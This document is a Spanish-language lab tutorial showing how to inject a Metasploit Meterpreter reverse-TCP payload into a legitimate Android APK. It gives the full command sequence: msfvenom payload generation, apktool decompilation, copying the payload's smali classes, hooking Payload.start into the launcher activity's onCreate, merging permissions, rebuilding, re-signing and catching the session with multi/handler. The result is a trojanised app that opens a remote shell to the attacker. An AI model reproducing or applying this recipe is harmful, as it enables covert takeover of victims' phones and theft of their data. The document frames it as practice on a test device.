# Inyección de Payload en APK Legítima

En esta práctica aprenderemos a inyectar de forma manual un payload de **Meterpreter** dentro de una aplicación Android legítima.

## Requerimientos
```bash
apt install metasploit-framework openjdk-21 apktool
```

## Preparación

1.  Crear directorio de trabajo:
    ```bash
    mkdir practica7 && cd practica7
    ```
2.  Generar o descargar un archivo `.keystore` para firmar la aplicación:
    ```bash
    keytool -genkey -v -keystore debug.keystore -keyalg RSA -keysize 2048 -validity 10000 -alias androiddebugkey
    ```

## Creación y Firma del Payload
Generamos el payload con `msfvenom`:
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=[TU_IP] LPORT=[TU_PUERTO] -o payload.apk
```
Firmamos el payload:
```bash
jarsigner -verbose -keystore debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA payload.apk androiddebugkey
```

## Decompilación con APKTool
Debemos decompilar tanto la aplicación legítima como el payload:

```bash
# Legítima (doble proceso para evitar errores de compilación posteriores)
apktool d -f -r -o original legitima.apk
apktool d -f -o original_tmp legitima.apk

# Sincronizamos el Manifest y eliminamos temporal
cp original_tmp/AndroidManifest.xml original/AndroidManifest.xml
rm -rf original_tmp

# Payload
apktool d -f -o payload_dir payload.apk
```

## Inyección del Payload
1.  Creamos la ruta en la aplicación original:
    ```bash
    mkdir -p original/smali/com/metasploit/stage/
    ```
2.  Copiamos los archivos `.smali` del payload:
    ```bash
    cp payload_dir/smali/com/metasploit/stage/* original/smali/com/metasploit/stage/
    ```

## Inyección del Hook
Buscamos la actividad principal en `AndroidManifest.xml` (la que tiene el `LAUNCHER`):
```xml
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
```
Ubicamos el archivo `.smali` correspondiente a esa actividad y buscamos el método `onCreate`. Inyectamos la siguiente línea:

```smali
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
```

## Permisos
Copia los permisos (`<uses-permission>`) necesarios del `AndroidManifest.xml` del payload al de la aplicación original, evitando duplicados.

## Compilación y Firma Final
1.  Re-compilamos:
    ```bash
    apktool b -o final.apk original/
    ```
2.  Firmamos el APK resultante:
    ```bash
    jarsigner -verbose -keystore debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA final.apk androiddebugkey
    ```

> **Nota:** Instala el APK en un dispositivo de prueba y activa el `multi/handler` en Metasploit para recibir la sesión.

> **Nota:** NO memorices aprende practicando, que la genialidad es igual a la repetición.
